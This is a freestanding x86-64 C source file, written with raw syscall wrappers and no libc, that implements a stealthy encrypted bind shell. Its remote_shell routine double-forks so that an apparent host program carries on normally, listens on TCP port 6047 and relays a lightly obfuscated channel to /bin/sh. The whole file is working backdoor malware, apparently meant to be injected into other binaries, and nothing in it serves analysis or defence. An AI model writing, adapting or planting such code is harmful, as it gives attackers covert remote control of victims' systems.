
#ifndef __always_inline
# define __always_inline __inline __attribute__ ((always_inline))
#endif

#define IS_LITTLE_ENDIAN

#define NULL (void*)0x0

#define EAGAIN 11

#define STDIN_FILENO 0
#define STDOUT_FILENO 1
#define STDERR_FILENO 2

# define AF_INET 2
# define SOCK_STREAM 1
# define INADDR_ANY ((unsigned int)0x00000000)

#define O_CREAT 0100
#define O_EXCL 0200
#define O_NONBLOCK 04000
#define F_GETFL 3
#define F_SETFL 4

#define PORT 6047
#define BUFFSZ 0x10000
#define ARGSVECMAX 0x40
#define LISTEN_BACKLOG 4
#define LOCKSHELL "/tmp/123"
#define LOCKTLS "/tmp/987"

__always_inline
static void exit(int status)
{
	__asm__ (
		"mov $60, %%rax\n\t"
		"mov %0, %%rdi\n\t"
		"syscall\n\t"
		:
		: "g" (status)
		: "rax", "rdi", "rcx", "r11"
	);
}

__always_inline
static int fork()
{
	long ret;

	__asm__ (
		"mov $57, %%rax\n\t"
		"syscall\n\t"
		"mov %%rax, %0"
		: "=r"(ret)
		: 
		: "rcx", "r11"
	);

	return (int)ret;
}

__always_inline
static int setsid()
{
	long ret;

	__asm__ (
		"mov $112, %%rax\n\t"
		"syscall\n\t"
		"mov %%rax, %0"
		: "=r"(ret)
		:
		: "rcx", "r11"
	);

	return (int)ret;
}

__always_inline
static int open(const char* pathname, int flags, int mode)
{
	long ret;

	__asm__ (
		"mov $2, %%rax\n\t"
		"mov %1, %%rdi\n\t"
		"mov %2, %%rsi\n\t"
		"mov %3, %%rdx\n\t"
		"syscall\n\t"
		"mov %%rax, %0"
		: "=r"(ret)
		: "g"(pathname), "g"(flags), "g"(mode)
		: "rdi", "rsi", "rdx", "rcx", "r11"
	);

	return (int)ret;
}

__always_inline
static int socket(int domain, int type, int protocol)
{
	long ret;

	__asm__ (
		"mov $41, %%rax\n\t"
		"mov %1, %%rdi\n\t"
		"mov %2, %%rsi\n\t"
		"mov %3, %%rdx\n\t"
		"syscall\n\t"
		"mov %%rax, %0"
		: "=r"(ret)
		: "g"(domain), "g"(type), "g"(protocol)
		: "rdi", "rsi", "rdx", "rcx", "r11"
	);

	return (int)ret;
}

struct in_addr_
{
    unsigned int s_addr;
};

struct sockaddr_in
{
	unsigned short sin_family;
	unsigned short sin_port;
	struct in_addr_ sin_addr;
	unsigned char sin_zero[6];
};

__always_inline
static int bind(int sockfd, const struct sockaddr_in *addr, unsigned int addrlen)
{
	long ret;

	__asm__ (
		"mov $49, %%rax\n\t"
		"mov %1, %%rdi\n\t"
		"mov %2, %%rsi\n\t"
		"mov %3, %%rdx\n\t"
		"syscall\n\t"
		"mov %%rax, %0"
		: "=r"(ret)
		: "g"(sockfd), "g"(addr), "g"(addrlen)
		: "rdi", "rsi", "rdx", "rcx", "r11"
	);

	return (int)ret;
}
__always_inline
static  int listen(int sockfd, int backlog)
{
	long ret;

	__asm__ (
		"mov $50, %%rax\n\t"
		"mov %1, %%rdi\n\t"
		"mov %2, %%rsi\n\t"
		"syscall\n\t"
		"mov %%rax, %0"
		: "=r"(ret)
		: "g"(sockfd), "g"(backlog)
		: "rdi", "rsi", "rcx", "r11"
	);

	return (int)ret;
}

__always_inline
static int accept(int sockfd, struct sockaddr_in *addr, unsigned int *addrlen)
{
	long ret;

	__asm__ (
		"mov $43, %%rax\n\t"
		"mov %1, %%rdi\n\t"
		"mov %2, %%rsi\n\t"
		"mov %3, %%rdx\n\t"
		"syscall\n\t"
		"mov %%rax, %0"
		: "=r"(ret)
		: "g"(sockfd), "g"(addr), "g"(addrlen)
		: "rdi", "rsi", "rdx", "rcx", "r11"
	);

	return (int)ret;
}

__always_inline
static int dup2(int oldfd, int newfd)
{
	long ret;

	__asm__ (
		"mov $33, %%rax\n\t"
		"mov %1, %%rdi\n\t"
		"mov %2, %%rsi\n\t"
		"syscall\n\t"
		"mov %%rax, %0"
		: "=r"(ret)
		: "g"(oldfd), "g"(newfd)
		: "rdi", "rsi", "rcx", "r11"
	);

	return (int)ret;
}


__always_inline
static int close(int fd)
{
	long ret;

	__asm__ (
		"mov $3, %%rax\n\t"
		"mov %1, %%rdi\n\t"
		"syscall\n\t"
		"mov %%rax, %0"
		: "=r"(ret)
		: "g"(fd)
		: "rdi", "rcx", "r11"
	);

	return (int)ret;
}

__always_inline
static int chdir(const char *path)
{
	long ret;

	__asm__ (
		"mov $80, %%rax\n\t"
		"mov %1, %%rdi\n\t"
		"syscall\n\t"
		"mov %%rax, %0"
		: "=r"(ret)
		: "g"(path)
		: "rdi", "rcx", "r11"
	);

	return (int)ret;
}

__always_inline
static int execve(const char *pathname, char *const argv[],
                  char *const envp[])
{
	long ret;

	__asm__ (
		"mov $59, %%rax\n\t"
		"mov %1, %%rdi\n\t"
		"mov %2, %%rsi\n\t"
		"mov %3, %%rdx\n\t"
		"syscall\n\t"
		"mov %%rax, %0"
		: "=r"(ret)
		: "g"(pathname), "g"(argv), "g"(envp)
		: "rdi", "rsi", "rdx", "rcx", "r11"
	);

	return (int)ret;
}

__always_inline
static int kill(int pid, int sig)
{
	long ret;

	__asm__ (
		"mov $62, %%rax\n\t"
		"mov %1, %%rdi\n\t"
		"mov %2, %%rsi\n\t"
		"syscall\n\t"
		"mov %%rax, %0"
		: "=r"(ret)
		: "g"(pid), "g"(sig)
		: "rdi", "rsi", "rcx", "r11"
	);

	return (int)ret;
}

__always_inline
static int unlink(const char *pathname)
{
	long ret;

	__asm__ (
		"mov $87, %%rax\n\t"
		"mov %1, %%rdi\n\t"
		"syscall\n\t"
		"mov %%rax, %0"
		: "=r"(ret)
		: "g"(pathname)
		: "rdi", "rcx", "r11"
	);

	return (int)ret;
}

__always_inline
static int pipe(int pipefd[2])
{
	long ret;

	__asm__ (
		"mov $22, %%rax\n\t"
		"mov %1, %%rdi\n\t"
		"syscall\n\t"
		"mov %%rax, %0"
		: "=r"(ret)
		: "g"(pipefd)
		: "rdi", "rcx", "r11"
	);

	return (int)ret;
}

__always_inline
static int wait4(int pid, int *wstatus, int options,
    void *rusage)
{
	long ret;

	__asm__ (
		"mov $61, %%rax\n\t"
		"mov %1, %%rdi\n\t"
		"mov %2, %%rsi\n\t"
		"mov %3, %%rdx\n\t"
		"mov %4, %%rcx\n\t"
		"syscall\n\t"
		"mov %%rax, %0"
		: "=r"(ret)
		: "g"(pid), "g"(wstatus), "g"(options), "g"(rusage)
		: "rdi", "rsi", "rdx", "rcx", "r11"
	);

	return (int)ret;
}

__always_inline
static long read(int fd, void* buff, unsigned long nbytes)
{
	long ret;

	__asm__ (
		"mov $0, %%rax\n\t"
		"mov %1, %%rdi\n\t"
		"mov %2, %%rsi\n\t"
		"mov %3, %%rdx\n\t"
		"syscall\n\t"
		"mov %%rax, %0"
		: "=r"(ret)
		: "g"(fd), "g"(buff), "g"(nbytes)
		: "rdi", "rsi", "rdx", "rcx", "r11"
	);

	return ret;
}

__always_inline
static long write(int fd, void* buff, unsigned long nbytes)
{
	long ret;

	__asm__ (
		"mov $1, %%rax\n\t"
		"mov %1, %%rdi\n\t"
		"mov %2, %%rsi\n\t"
		"mov %3, %%rdx\n\t"
		"syscall\n\t"
		"mov %%rax, %0"
		: "=r"(ret)
		: "g"(fd), "g"(buff), "g"(nbytes)
		: "rdi", "rsi", "rdx", "rcx", "r11"
	);

	return ret;
}

struct timespec
{
	long	tv_sec;
	long	tv_nsec;
};

__always_inline
static int nanosleep(const struct timespec* req, struct timespec* rem)
{
	long ret;

	__asm__ (
		"mov $35, %%rax\n\t"
		"mov %1, %%rdi\n\t"
		"mov %2, %%rsi\n\t"
		"syscall\n\t"
		"mov %%rax, %0"
		: "=r"(ret)
		: "g"(req), "g"(rem)
		: "rdi", "rsi", "rcx", "r11"
	);

	return (int)ret;
}

__always_inline
static int fcntl(int fd, int cmd, int arg)
{
	long ret;

	__asm__ (
		"mov $72, %%rax\n\t"
		"mov %1, %%rdi\n\t"
		"mov %2, %%rsi\n\t"
		"mov %3, %%rdx\n\t"
		"syscall\n\t"
		"mov %%rax, %0"
		: "=r"(ret)
		: "g"(fd), "g"(cmd), "g"(arg)
		: "rdi", "rsi", "rdx", "rcx", "r11"
	);

	return (int)ret;
}

__always_inline
static unsigned short htons(unsigned short n)
{
	#ifdef IS_LITTLE_ENDIAN
		return n =  ((unsigned short) ((((n) >> 8) & 0xff) | (((n) & 0xff) << 8)));
	#endif
		return n;
}

void _memcpy(void *restrict dest, const void* restrict src, unsigned long n)
{
    ///TODO: Use long ptr for optimization
    char* d = (char*)dest;
    const char* s = (const char*)src;

    for (unsigned long i = 0 ; i < n ; i++)
        d[i] = s[i];
}

void	*memmove(void *dst, const void *src, unsigned long len)
{
	if (src > dst)
		_memcpy(dst, src, len);
	else if (dst != src)
		while (len--)
			((char*)dst)[len] = ((char*)src)[len];
	return (dst);
}

__always_inline
static void bzero(void* ptr, unsigned long nbytes)
{
	char* d = (char*)ptr;

	for (unsigned long i = 0 ; i < nbytes ; i++)
		d[i] = 0;
}

#define ROTR(x, n) ( ((x) << (n)) | ((x) >> (8 - (n))) )
#define ROTL(x, n) ( ((x) >> (n)) | ((x) << (8 - (n))) )

///TODO: Include the (de/en)crypt functions from the lib

__always_inline
static void encrypt(char* plaintext, unsigned long nbytes, unsigned long key)
{
	const unsigned char* const bkey = (unsigned char*)&key;

	for (unsigned int i = 0 ; i < nbytes ; i++)
	{
		char key_c = bkey[i & (sizeof(key) - 1)];

		plaintext[i] ^= key_c;
		plaintext[i] = ~plaintext[i];
//		plaintext[i] = ROTR(plaintext[i], i & (sizeof(key) - 1));
		plaintext[i] += key_c;
	}
}

__always_inline
static void decrypt(char* ciphertext, unsigned long nbytes, unsigned long key)
{
	const unsigned char* const bkey = (unsigned char*)&key;

	for (unsigned int i = 0 ; i < nbytes ; i++)
	{
		char key_c = bkey[i & (sizeof(key) - 1)];

		ciphertext[i] -= key_c;
//		ciphertext[i] = ROTL(ciphertext[i], i & (sizeof(key) - 1));
		ciphertext[i] = ~ciphertext[i];
		ciphertext[i] ^= key_c;
	}
}

void make_non_block(int fd)
{
	int flags = fcntl(fd, F_GETFL, 0);
	if (flags < 0 || fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0)
		exit(0);
}

void remote_shell(unsigned long key)
{
	int lockfd_shell_fd;
	int lockfd_tls_fd;
	int pid;
	const char lock_shell_filename[] = LOCKSHELL;
	const char lock_tls_filename[] = LOCKTLS;

	int pipesfd_in[2];
	int pipesfd_out[2];
	int end_tls = 0;

	/* Become background process, the parent proceeds
		with its normal execution flow */
	pid = fork(); 
	if (pid > 0)
		return ;
	else if (pid < 0)
		exit(0);

	/* Child becomes a session leader */
	if (setsid() < 0)
		goto finish_shell;

	/* Spawn another child and kill the session leader,
		so the init process will adopt the orphan child */
	pid = fork();
	if (pid != 0)
		exit(0);

	/* (En/De)cryptor deamon starts here: */

	int srv_sockfd;
	int cli_sockfd;
	struct sockaddr_in srv_addr;
	struct sockaddr_in cli_addr;
	unsigned long buffcli_size = 0;
	char buff_cli[BUFFSZ];
	unsigned long buffshell_size = 0;
	char buff_shell[BUFFSZ];

	/* If already up, exit */
	if ((lockfd_tls_fd = open(lock_tls_filename, O_CREAT | O_EXCL, 00666)) < 0)
		goto finish_tls;

	/* Create a server which accepts 1 client: */

	if ((srv_sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		goto finish_tls;

	bzero(buff_cli, sizeof(buff_cli) / sizeof(*buff_cli));
	bzero(buff_shell, sizeof(buff_shell) / sizeof(*buff_shell));

	srv_addr.sin_family = AF_INET;
	srv_addr.sin_addr.s_addr = INADDR_ANY;
	srv_addr.sin_port = htons(PORT);

	long st = -1;
	while(st < 0)
	{
		st = bind(srv_sockfd, &srv_addr, sizeof(srv_addr));
		srv_addr.sin_port = htons(htons(srv_addr.sin_port) + 1);
	}

	if (listen(srv_sockfd, LISTEN_BACKLOG) < 0)
		goto finish_tls;

	for ( ; ; )
	{
		if ((cli_sockfd = accept(srv_sockfd, &cli_addr, (unsigned int[]){sizeof(cli_addr)})) < 0)
			goto finish_tls;

		/* (En/De)cryptor -> Shell's STDIN */
		if (pipe(pipesfd_in) < 0)
			goto finish_tls;
		/* Shell's STDOUT -> (En/De)cryptor */
		if (pipe(pipesfd_out) < 0)
			goto finish_tls;

		/* Spawn another deamon which executes a shell */
		pid = fork();
		if (pid == 0)
			goto shell;
		else if (pid < 0)
			exit(0);

		/* Close unused duplicates */
		if (close(pipesfd_in[0]) < 0)
			goto finish_tls;
		if (close(pipesfd_out[1]) < 0)
			goto finish_tls;

		/* Make fds non block */
		make_non_block(cli_sockfd);
		make_non_block(pipesfd_in[1]);
		make_non_block(pipesfd_out[0]);

		for ( ; ; )
		{
			struct timespec req = {.tv_sec=0, .tv_nsec=10000000};
			nanosleep((void*)&req, NULL);

			/* Write to the client */
			if (buffshell_size != 0)
			{
				long nwritten = write(cli_sockfd, buff_shell, buffshell_size);
				if (nwritten != -EAGAIN)
				{
					if (nwritten < 0)
						exit(0);
					if (nwritten == 0)
						break ;

					if ((unsigned long)nwritten != buffshell_size)
						memmove(buff_shell, buff_shell + nwritten, buffshell_size - nwritten);

					buffshell_size -= nwritten;
				}

			}
			/* Read from the shell */
			else
			{
				long nread = read(pipesfd_out[0], buff_shell, sizeof(buff_shell) / sizeof(*buff_shell));

				if (nread != -EAGAIN)
				{
					if ((long)buffshell_size < 0)
						exit(0);
	
					buffshell_size = (unsigned long)nread;

					encrypt(buff_shell, buffshell_size, key);
				}
			}

			/* Write to shell */
			if (buffcli_size != 0)
			{
				long nwritten = write(pipesfd_in[1], buff_cli, buffcli_size);
				if (nwritten != -EAGAIN)
				{
					if (nwritten < 0)
						exit(0);

					if (nwritten == 0)
						break ;

					if ((unsigned long)nwritten != buffshell_size)
						memmove(buff_cli, buff_cli + nwritten, buffcli_size - nwritten);

					buffcli_size -= nwritten;
				}
			}
			/* Read from client */
			else
			{
				long nread = read(cli_sockfd, buff_cli, sizeof(buff_cli) / sizeof(*buff_cli));
				
				if (nread != -EAGAIN)
				{
					if ((long)buffcli_size < 0)
						exit(0);

					buffcli_size = (unsigned long)nread;

					decrypt(buff_cli, buffcli_size, key);

					if (buffcli_size == 5 && buff_cli[0] == 'e' && buff_cli[1] == 'x'
					&& buff_cli[2] == 'i' && buff_cli[3] == 't' && buff_cli[4] == '\n')
					{
						end_tls = 1;
						break ;
					}

					if (buffcli_size == 0)
						break ;
				}

			}
		}

		close(cli_sockfd);
		close(pipesfd_in[1]);
		close(pipesfd_out[0]);

		if (end_tls == 1)
		{
			close(lockfd_tls_fd);
			unlink(lock_tls_filename);
finish_tls:
			close(lockfd_tls_fd);
			exit(0);
		}
	}

shell:

	/* Child becomes a session leader */
	if (setsid() < 0)
		goto finish_shell;

	/* Kill the session leader and continue on the child 
		to ensure that the init process will adopt the orphans */
	pid = fork(); 
	if (pid != 0)
		exit(0);

	/* Create anoter child which will execute a shell while
		the parent wait to child termination */ 
	pid = fork();
	if (pid < 0)
		exit(0);
	if (pid == 0)
	{
		/* Shell deamon starts here: */

		/* If already up, exit */
		if ((lockfd_shell_fd = open(lock_shell_filename, O_CREAT | O_EXCL, 00666)) < 0)
			goto finish_shell;

		/* Close unused duplicates */
		if (close(pipesfd_in[1]) < 0)
			goto finish_shell;
		if (close(pipesfd_out[0]) < 0)
			goto finish_shell;

		/* Replace STDIN, STDOUT by the (En/De)cryptor's fds
			and replace STDERR by STDOUT */
		if (dup2(pipesfd_in[0], STDIN_FILENO) < 0)
			goto finish_shell;
		if (dup2(pipesfd_out[1], STDOUT_FILENO) < 0)
			goto finish_shell;
		if (dup2(STDOUT_FILENO, STDERR_FILENO) < 0)
			goto finish_shell;

		/* Switch working directory to root */
		char rootpath[] = "/";
		if (chdir(rootpath) < 0)
			goto finish_shell;

		/* Execute a Shell */
		execve("/bin/sh", (char*[]){"/bin/sh", 0}, 0);
		goto finish_shell;

	}
	else if (pid > 0)
	{
		/* Shell parent starts here: */

		/* Close unused duplicates */
		close(pipesfd_in[1]);
		close(pipesfd_out[0]);
		close(pipesfd_in[0]);
		close(pipesfd_out[1]);

		/* Wait for the shell to end and then free fds
			and unlink lock */
		wait4(pid, 0, 0, 0);
finish_shell:
		close(lockfd_shell_fd);
		unlink(lock_shell_filename);
		exit(0);
	}
}

void _start()
{
	unsigned long key = 1234;
	remote_shell(key);

	exit(0);
}
